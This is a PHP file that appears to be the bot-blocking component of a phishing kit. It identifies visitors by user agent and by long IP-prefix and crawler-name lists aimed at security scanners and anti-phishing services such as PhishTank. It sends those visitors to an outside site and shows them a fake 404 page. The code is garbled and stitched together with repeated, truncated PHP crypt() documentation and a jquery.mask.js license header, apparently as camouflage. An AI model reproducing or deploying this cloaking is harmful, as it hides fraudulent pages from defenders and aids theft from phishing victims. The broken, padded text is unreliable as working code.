<?php

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

/*       "^66.102.*.*",
		 "^38.100.*.*",
		 "^107.170.*.*",
		 "^149.20.*.*",
		 "^38.105.*.*",
		 "^74.125.*.*",
		 "^66.150.14.*",
		 "^54.176.*.*",
		 "^38.100.*.*",
		 "^184.173.*.*",
		 "^66.249.*.*",
		 "^128.242.*.*",
		 "^72.14.192.*",
		 "^208.65.144.*",
		 "^74.125.*.*",
		 "^209.85.128.*",
		 "^216.239.32.*",
		 "^74.125.*.*",
		 "^207.126.144.*",
		 "^173.194.*.*",
		 "^64.233.160.*",
		 "^72.14.192.*",
		 "^66.102.*.*",
		 "^64.18.*.*",
		 "^194.52.68.*",
		 "^194.72.238.*",
		 "^62.116.207.*",
		 "^212.50.193.*",
		 "^69.65.*.*",
		 "^50.7.*.*",
		 "^131.212.*.*",
		 "^46.116.*.*",
		 "^62.90.*.*",
		 "^89.138.*.*",
		 "^82.166.*.*",
		 "^85.64.*.*",
		 "^85.250.*.*",
		 "^89.138.*.*",
		 "^93.172.*.*",
		 "^109.186.*.*",
		 "^194.90.*.*",
		 "^212.29.192.*",
		 "^212.29.224.*",
		 "^212.143.*.*",
		 "^212.150.*.*",
		 "^212.235.*.*",
		 "^217.132.*.*",
		 "^50.97.*.*",
		 "^217.132.*.*",
		 "^209.85.*.*",
		 "^66.205.64.*",
		 "^204.14.48.*",
		 "^64.27.2.*",
		 "^67.15.*.*",
		 "^202.108.252.*",
		 "^193.47.80.*",
		 "^64.62.136.*",
		 "^66.221.*.*",
		 "^64.62.175.*",
		 "^198.54.*.*",
		 "^192.115.134.*",
		 "^216.252.167.*",
		 "^193.253.199.*",
		 "^69.61.12.*",
		 "^64.37.103.*",
		 "^38.144.36.*",
		 "^64.124.14.*",
		 "^206.28.72.*",
		 "^209.73.228.*",
		 "^158.108.*.*",
		 "^168.188.*.*",
		 "^66.207.120.*",
		 "^167.24.*.*",
		 "^192.118.48.*",
		 "^67.209.128.*",
		 "^12.148.209.*",
		 "^12.148.196.*",
		 "^193.220.178.*",
		 "68.65.53.71",
		 "^198.25.*.*",
		 "^64.106.213.*");
         $Botname = array( // LIST BOOTS NAME
		 "bot",
		 "above",
		 "google",
		 "softlayer",
		 "amazonaws",
		 "cyveillance",
		 "compatible",
		 "facebook",
		 "phishtank",
		 "dreamhost",
		 "netpilot",
		 "calyxinstitute",
		 "tor-exit",
		 "apache-httpclient",
		 "lssrocketcrawler",
		 "Trident",
		 "X11",
		 "Macintosh",
		 "crawler",
		 "urlredirectresolver",
		 "jetbrains",
		 "spam",
		 "windows 95",
		 "windows 98",
		 "acunetix",
		 "netsparker",
		 "google",
		 "007ac9",
		 "008",
		 "192.comagent",
		 "200pleasebot",
		 "360spider",
		 "4seohuntbot",
		 "50.nu",
		 "a6-indexer",
		 "admantx",
		 "amznkassocbot",
		 "aboundexbot",
		 "aboutusbot",
		 "abrave spider",
		 "accelobot",
		 "acoonbot",
		 "addthis.com",
		 "adsbot-google",
		 "ahrefsbot",
		 "alexabot",
		 "amagit.com",
		 "analytics",
		 "antbot",
		 "apercite",
		 "aportworm",
		 "arabot",
		 "crawl",
		 "slurp",
		 "spider",
		 "seek",
		 "accoona",
		 "acoon",
		 "adressendeutschland",
		 "ah-ha.com",
		 "ahoy",
		 "altavista",
		 "ananzi",
		 "anthill",
		 "appie",
		 "arachnophilia",
		 "arale",
		 "araneo",
		 "aranha",
		 "architext",
		 "aretha",
		 "arks",
		 "asterias",
		 "atlocal",
		 "atn",
		 "atomz",
		 "augurfind",
		 "backrub",
		 "bannana_bot",
		 "baypup",
		 "bdfetch",
		 "big brother",
		 "biglotron",
		 "bjaaland",
		 "blackwidow",
		 "blaiz",
		 "blog",
		 "blo.",
		 "bloodhound",
		 "boitho",
		 "booch",
		 "bradley",
		 "butterfly",
		 "calif",
		 "cassandra",
		 "ccubee",
		 "cfetch",
		 "charlotte",
		 "churl",
		 "cienciaficcion",
		 "cmc",
		 "collective",
		 "comagent",
		 "combine",
		 "computingsite",
		 "csci",
		 "curl",
		 "cusco",
		 "daumoa",
		 "deepindex",
		 "delorie",
		 "depspid",
		 "deweb",
		 "die blinde kuh",
		 "digger",
		 "ditto",
		 "dmoz",
		 "docomo",
		 "download express",
		 "dtaagent",
		 "dwcp",
		 "ebiness",
		 "ebingbong",
		 "e-collector",
		 "ejupiter",
		 "emacs-w3 search engine",
		 "esther",
		 "evliya celebi",
		 "ezresult",
		 "falcon",
		 "felix ide",
		 "ferret",
		 "fetchrover",
		 "fido",
		 "findlinks",
		 "fireball",
		 "fish search",
		 "fouineur",
		 "funnelweb",
		 "gazz",
		 "gcreep",
		 "genieknows",
		 "getterroboplus",
		 "geturl",
		 "glx",
		 "goforit",
		 "golem",
		 "grabber",
		 "grapnel",
		 "gralon",
		 "griffon",
		 "gromit",
		 "grub",
		 "gulliver",
		 "hamahakki",
		 "harvest",
		 "havindex",
		 "helix",
		 "heritrix",
		 "hku www octopus",
		 "homerweb",
		 "htdig",
		 "html index",
		 "html_analyzer",
		 "htmlgobble",
		 "hubater",
		 "hyper-decontextualizer",
		 "ia_archiver",
		 "ibm_planetwide",
		 "ichiro",
		 "iconsurf",
		 "iltrovatore",
		 "image.kapsi.net",
		 "imagelock",
		 "incywincy",
		 "indexer",
		 "infobee",
		 "informant",
		 "ingrid",
		 "inktomisearch.com",
		 "inspector web",
		 "intelliagent",
		 "internet shinchakubin",
		 "ip3000",
		 "iron33",
		 "israeli-search",
		 "ivia",
		 "jack",
		 "jakarta",
		 "javabee",
		 "jetbot",
		 "jumpstation",
		 "katipo",
		 "kdd-explorer",
		 "kilroy",
		 "knowledge",
		 "kototoi",
		 "kretrieve",
		 "labelgrabber",
		 "lachesis",
		 "larbin",
		 "legs",
		 "libwww",
		 "linkalarm",
		 "link validator",
		 "linkscan",
		 "lockon",
		 "lwp",
		 "lycos",
		 "magpie",
		 "mantraagent",
		 "mapoftheinternet",
		 "marvin/",
		 "mattie",
		 "mediafox",
		 "mediapartners",
		 "mercator",
		 "merzscope",
		 "microsoft url control",
		 "minirank",
		 "miva",
		 "mj12",
		 "mnogosearch",
		 "moget",
		 "monster",
		 "moose",
		 "motor",
		 "multitext",
		 "muncher",
		 "muscatferret",
		 "mwd.search",
		 "myweb",
		 "najdi",
		 "nameprotect",
		 "nationaldirectory",
		 "nazilla",
		 "ncsa beta",
		 "nec-meshexplorer",
		 "nederland.zoek",
		 "netcarta webmap engine",
		 "netmechanic",
		 "netresearchserver",
		 "netscoop",
		 "newscan-online",
		 "nhse",
		 "nokia6682/",
		 "nomad",
		 "noyona",
		 "nutch",
		 "nzexplorer",
		 "objectssearch",
		 "occam",
		 "omni",
		 "open text",
		 "openfind",
		 "openintelligencedata",
		 "orb search",
		 "osis-project",
		 "pack rat",
		 "pageboy",
		 "pagebull",
		 "page_verifier",
		 "panscient",
		 "parasite",
		 "partnersite",
		 "patric",
		 "pear.",
		 "pegasus",
		 "peregrinator",
		 "pgp key agent",
		 "phantom",
		 "phpdig",
		 "picosearch",
		 "piltdownman",
		 "pimptrain",
		 "pinpoint",
		 "pioneer",
		 "piranha",
		 "plumtreewebaccessor",
		 "pogodak",
		 "poirot",
		 "pompos",
		 "poppelsdorf",
		 "poppi",
		 "popular iconoclast",
		 "psycheclone",
		 "publisher",
		 "python",
		 "rambler",
		 "raven search",
		 "roach",
		 "road runner",
		 "roadhouse",
		 "robbie",
		 "robofox",
		 "robozilla",
		 "rules",
		 "salty",
		 "sbider",
		 "scooter",
		 "scoutjet",
		 "scrubby",
		 "search.",
		 "searchprocess",
		 "semanticdiscovery",
		 "senrigan",
		 "sg-scout",
		 "shai'hulud",
		 "shark",
		 "shopwiki",
		 "sidewinder",
		 "sift",
		 "silk",
		 "simmany",
		 "site searcher",
		 "site valet",
		 "sitetech-rover",
		 "skymob.com",
		 "sleek",
		 "smartwit",
		 "sna-",
		 "snappy",
		 "snooper",
		 "sohu",
		 "speedfind",
		 "sphere",
		 "sphider",
		 "spinner",
		 "spyder",
		 "steeler/",
		 "suke",
		 "suntek",
		 "supersnooper",
		 "surfnomore",
		 "sven",
		 "sygol",
		 "szukacz",
		 "tach black widow",
		 "tarantula",
		 "templeton",
		 "/teoma",
		 "t-h-u-n-d-e-r-s-t-o-n-e",
		 "theophrastus",
		 "titan",
		 "titin",
		 "tkwww",
		 "toutatis",
		 "t-rex",
		 "tutorgig",
		 "twiceler",
		 "twisted",
		 "ucsd",
		 "udmsearch",
		 "url check",
		 "updated",
		 "vagabondo",
		 "valkyrie",
		 "verticrawl",
		 "victoria",
		 "vision-search",
		 "volcano",
		 "voyager/",
		 "voyager-hc",
		 "w3c_validator",
		 "w3m2",
		 "w3mir",
		 "walker",
		 "wallpaper",
		 "wanderer",
		 "wauuu",
		 "wavefire",
		 "web core",
		 "web hopper",
		 "web wombat",
		 "webbandit",
         "webcatcher",
		 "webcopy",
		 "webfoot",
		 "weblayers",
		 "weblinker",
		 "weblog monitor",
		 "webmirror",
		 "webmonkey",
		 "webquest",
		 "webreaper",
		 "websitepulse",
		 "websnarf",
		 "webstolperer",
		 "webvac",
		 "webwalk",
		 "webwatch",
		 "webwombat",
		 "webzinger",
		 "wget",
		 "whizbang",
		 "whowhere",
		 "wild ferret",
		 "worldlight",
		 "wwwc",
		 "wwwster",
		 "xenu",
		 "xift",
		 "xirq",
		 "yandex",
		 "yanga",
		 "yeti",
		 "yahoo!");
81.161.59.*",
"^66.135.200.*",
"^66.102.*.*",
"^38.100.*.*
","^107.170.*.*
","^149.20.*.*",
"^38.105.*.*",
"^74.125.*.*",
"^66.150.14.*"
,"^54.176.*.*",
"^38.100.*.*",
"^184.173.*.*",
"^66.249.*.*",
"^128.242.*.*",
"^72.14.192.*",
"^208.65.144.*",
"^74.125.*.*",
"^209.85.128.*",
"^216.239.32.*",
"^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","^91.103.66.*","^208.91.115.*","^199.30.228.*");if(in_array($c28dd9c,$c97h77ec)){exit(header('Location: http://3m.ma'));}else{foreach($c97h77ec as $a4nde){if(preg_match('/'.$a4nde.'/',$c28dd9c)){header('Location: http://3m.ma');echo("<h1>404 Not Found</h1>
    The page that you have requested could not be found.
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - "^66.102.*.*",
		 "^38.100.*.*",
		 "^107.170.*.*",
		 "^149.20.*.*",
		 "^38.105.*.*",
		 "^74.125.*.*",
		 "^66.150.14.*",
		 "^54.176.*.*",
		 "^38.100.*.*",
		 "^184.173.*.*",
		 "^66.249.*.*",
		 "^128.242.*.*",
		 "^72.14.192.*",
		 "^208.65.144.*",
		 "^74.125.*.*",
		 "^209.85.128.*",
		 "^216.239.32.*",
		 "^74.125.*.*",
		 "^207.126.144.*",
		 "^173.194.*.*",
		 "^64.233.160.*",
		 "^72.14.192.*",
		 "^66.102.*.*",
		 "^64.18.*.*",
		 "^194.52.68.*",
		 "^194.72.238.*",
		 "^62.116.207.*",
		 "^212.50.193.*",
		 "^69.65.*.*",
		 "^50.7.*.*",
		 "^131.212.*.*",
		 "^46.116.*.*",
		 "^62.90.*.*",
		 "^89.138.*.*",
		 "^82.166.*.*",
		 "^85.64.*.*",
		 "^85.250.*.*",
		 "^89.138.*.*",
		 "^93.172.*.*",
		 "^109.186.*.*",
		 "^194.90.*.*",
		 "^212.29.192.*",
		 "^212.29.224.*",
		 "^212.143.*.*",
		 "^212.150.*.*",
		 "^212.235.*.*",
		 "^217.132.*.*",
		 "^50.97.*.*",
		 "^217.132.*.*",
		 "^209.85.*.*",
		 "^66.205.64.*",
		 "^204.14.48.*",
		 "^64.27.2.*",
		 "^67.15.*.*",
		 "^202.108.252.*",
		 "^193.47.80.*",
		 "^64.62.136.*",
		 "^66.221.*.*",
		 "^64.62.175.*",
		 "^198.54.*.*",
		 "^192.115.134.*",
		 "^216.252.167.*",
		 "^193.253.199.*",
		 "^69.61.12.*",
		 "^64.37.103.*",
		 "^38.144.36.*",
		 "^64.124.14.*",
		 "^206.28.72.*",
		 "^209.73.228.*",
		 "^158.108.*.*",
		 "^168.188.*.*",
		 "^66.207.120.*",
		 "^167.24.*.*",
		 "^192.118.48.*",
		 "^67.209.128.*",
		 "^12.148.209.*",
		 "^12.148.196.*",
		 "^193.220.178.*",
		 "68.65.53.71",
		 "^198.25.*.*",
		 "^64.106.213.*");
$Botname = array( // LIST BOOTS NAME
		 "bot",
		 "above",
		 "google",
		 "softlayer",
		 "amazonaws",
		 "cyveillance",
		 "compatible",
		 "facebook",
		 "phishtank",
		 "dreamhost",
		 "netpilot",
		 "calyxinstitute",
		 "tor-exit",
		 "apache-httpclient",
		 "lssrocketcrawler",
		 "Trident",
		 "X11",
		 "Macintosh",
		 "crawler",
		 "urlredirectresolver",
		 "jetbrains",
		 "spam",
		 "windows 95",
		 "windows 98",
		 "acunetix",
		 "netsparker",
		 "google",
		 "007ac9",
		 "008",
		 "192.comagent",
		 "200pleasebot",
		 "360spider",
		 "4seohuntbot",
		 "50.nu",
		 "a6-indexer",
		 "admantx",
		 "amznkassocbot",
		 "aboundexbot",
		 "aboutusbot",
		 "abrave spider",
		 "accelobot",
		 "acoonbot",
		 "addthis.com",
		 "adsbot-google",
		 "ahrefsbot",
		 "alexabot",
		 "amagit.com",
		 "analytics",
		 "antbot",
		 "apercite",
		 "aportworm",
		 "arabot",
		 "crawl",
		 "slurp",
		 "spider",
		 "seek",
		 "accoona",
		 "acoon",
		 "adressendeutschland",
		 "ah-ha.com",
		 "ahoy",
		 "altavista",
		 "ananzi",
		 "anthill",
		 "appie",
		 "arachnophilia",
		 "arale",
		 "araneo",
		 "aranha",
		 "architext",
		 "aretha",
		 "arks",
		 "asterias",
		 "atlocal",
		 "atn",
		 "atomz",
		 "augurfind",
		 "backrub",
		 "bannana_bot",
		 "baypup",
		 "bdfetch",
		 "big brother",
		 "biglotron",
		 "bjaaland",
		 "blackwidow",
		 "blaiz",
		 "blog",
		 "blo.",
		 "bloodhound",
		 "boitho",
		 "booch",
		 "bradley",
		 "butterfly",
		 "calif",
		 "cassandra",
		 "ccubee",
		 "cfetch",
		 "charlotte",
		 "churl",
		 "cienciaficcion",
		 "cmc",
		 "collective",
		 "comagent",
		 "combine",
		 "computingsite",
		 "csci",
		 "curl",
		 "cusco",
		 "daumoa",
		 "deepindex",
		 "delorie",
		 "depspid",
		 "deweb",
		 "die blinde kuh",
		 "digger",
		 "ditto",
		 "dmoz",
		 "docomo",
		 "download express",
		 "dtaagent",
		 "dwcp",
		 "ebiness",
		 "ebingbong",
		 "e-collector",
		 "ejupiter",
		 "emacs-w3 search engine",
		 "esther",
		 "evliya celebi",
		 "ezresult",
		 "falcon",
		 "felix ide",
		 "ferret",
		 "fetchrover",
		 "fido",
		 "findlinks",
		 "fireball",
		 "fish search",
		 "fouineur",
		 "funnelweb",
		 "gazz",
		 "gcreep",
		 "genieknows",
		 "getterroboplus",
		 "geturl",
		 "glx",
		 "goforit",
		 "golem",
		 "grabber",
		 "grapnel",
		 "gralon",
		 "griffon",
		 "gromit",
		 "grub",
		 "gulliver",
		 "hamahakki",
		 "harvest",
		 "havindex",
		 "helix",
		 "heritrix",
		 "hku www octopus",
		 "homerweb",
		 "htdig",
		 "html index",
		 "html_analyzer",
		 "htmlgobble",
		 "hubater",
		 "hyper-decontextualizer",
		 "ia_archiver",
		 "ibm_planetwide",
		 "ichiro",
		 "iconsurf",
		 "iltrovatore",
		 "image.kapsi.net",
		 "imagelock",
		 "incywincy",
		 "indexer",
		 "infobee",
		 "informant",
		 "ingrid",
		 "inktomisearch.com",
		 "inspector web",
		 "intelliagent",
		 "internet shinchakubin",
		 "ip3000",
		 "iron33",
		 "israeli-search",
		 "ivia",
		 "jack",
		 "jakarta",
		 "javabee",
		 "jetbot",
		 "jumpstation",
		 "katipo",
		 "kdd-explorer",
		 "kilroy",
		 "knowledge",
		 "kototoi",
		 "kretrieve",
		 "labelgrabber",
		 "lachesis",
		 "larbin",
		 "legs",
		 "libwww",
		 "linkalarm",
		 "link validator",
		 "linkscan",
		 "lockon",
		 "lwp",
		 "lycos",
		 "magpie",
		 "mantraagent",
		 "mapoftheinternet",
		 "marvin/",
		 "mattie",
		 "mediafox",
		 "mediapartners",
		 "mercator",
		 "merzscope",
		 "microsoft url control",
		 "minirank",
		 "miva",
		 "mj12",
		 "mnogosearch",
		 "moget",
		 "monster",
		 "moose",
		 "motor",
		 "multitext",
		 "muncher",
		 "muscatferret",
		 "mwd.search",
		 "myweb",
		 "najdi",
		 "nameprotect",
		 "nationaldirectory",
		 "nazilla",
		 "ncsa beta",
		 "nec-meshexplorer",
		 "nederland.zoek",
		 "netcarta webmap engine",
		 "netmechanic",
		 "netresearchserver",
		 "netscoop",
		 "newscan-online",
		 "nhse",
		 "nokia6682/",
		 "nomad",
		 "noyona",
		 "nutch",
		 "nzexplorer",
		 "objectssearch",
		 "occam",
		 "omni",
		 "open text",
		 "openfind",
		 "openintelligencedata",
		 "orb search",
		 "osis-project",
		 "pack rat",
		 "pageboy",
		 "pagebull",
		 "page_verifier",
		 "panscient",
		 "parasite",
		 "partnersite",
		 "patric",
		 "pear.",
		 "pegasus",
		 "peregrinator",
		 "pgp key agent",
		 "phantom",
		 "phpdig",
		 "picosearch",
		 "piltdownman",
		 "pimptrain",
		 "pinpoint",
		 "pioneer",
		 "piranha",
		 "plumtreewebaccessor",
		 "pogodak",
		 "poirot",
		 "pompos",
		 "poppelsdorf",
		 "poppi",
		 "popular iconoclast",
		 "psycheclone",
		 "publisher",
		 "python",
		 "rambler",
		 "raven search",
		 "roach",
		 "road runner",
		 "roadhouse",
		 "robbie",
		 "robofox",
		 "robozilla",
		 "rules",
		 "salty",
		 "sbider",
		 "scooter",
		 "scoutjet",
		 "scrubby",
		 "search.",
		 "searchprocess",
		 "semanticdiscovery",
		 "senrigan",
		 "sg-scout",
		 "shai'hulud",
		 "shark",
		 "shopwiki",
		 "sidewinder",
		 "sift",
		 "silk",
		 "simmany",
		 "site searcher",
		 "site valet",
		 "sitetech-rover",
		 "skymob.com",
		 "sleek",
		 "smartwit",
		 "sna-",
		 "snappy",
		 "snooper",
		 "sohu",
		 "speedfind",
		 "sphere",
		 "sphider",
		 "spinner",
		 "spyder",
		 "steeler/",
		 "suke",
		 "suntek",
		 "supersnooper",
		 "surfnomore",
		 "sven",
		 "sygol",
		 "szukacz",
		 "tach black widow",
		 "tarantula",
		 "templeton",
		 "/teoma",
		 "t-h-u-n-d-e-r-s-t-o-n-e",
		 "theophrastus",
		 "titan",
		 "titin",
		 "tkwww",
		 "toutatis",
		 "t-rex",
		 "tutorgig",
		 "twiceler",
		 "twisted",
		 "ucsd",
		 "udmsearch",
		 "url check",
		 "updated",
		 "vagabondo",
		 "valkyrie",
		 "verticrawl",
		 "victoria",
		 "vision-search",
		 "volcano",
		 "voyager/",
		 "voyager-hc",
		 "w3c_validator",
		 "w3m2",
		 "w3mir",
		 "walker",
		 "wallpaper",
		 "wanderer",
		 "wauuu",
		 "wavefire",
		 "web core",
		 "web hopper",
		 "web wombat",
		 "webbandit",
         "webcatcher",
		 "webcopy",
		 "webfoot",
		 "weblayers",
		 "weblinker",
		 "weblog monitor",
		 "webmirror",
		 "webmonkey",
		 "webquest",
		 "webreaper",
		 "websitepulse",
		 "websnarf",
		 "webstolperer",
		 "webvac",
		 "webwalk",
		 "webwatch",
		 "webwombat",
		 "webzinger",
		 "wget",
		 "whizbang",
		 "whowhere",
		 "wild ferret",
		 "worldlight",
		 "wwwc",
		 "wwwster",
		 "xenu",
		 "xift",
		 "xirq",
		 "yandex",
		 "yanga",
		 "yeti",
		 "yahoo!");SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
/*
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
*/$antic1 =/*
 * jquery.mask.js
 * @version: v1.14.16
 * @author: Igor Escobar
 *
 * Created by Igor Escobar on 2012-03-10. Please report any bug at github.com/igorescobar/jQuery-Mask-Plugin
 *
 * Copyright (c) 2012 Igor Escobar http://igorescobar.com
 *
 * The MIT License (http://www.opensource.org/licenses/mit-license.php)
 *
 * Permission is hereby granted, free of charge, to any person
 * obtaining a copy of this software and associated documentation
 * files (the "Software"), to deal in the Software without
 * restriction, including without limitation the rights to use,
 * copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following
 * conditions:
 *
 * The above copyright notice and this permission notice shall be
 * included in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
 * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
 * WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
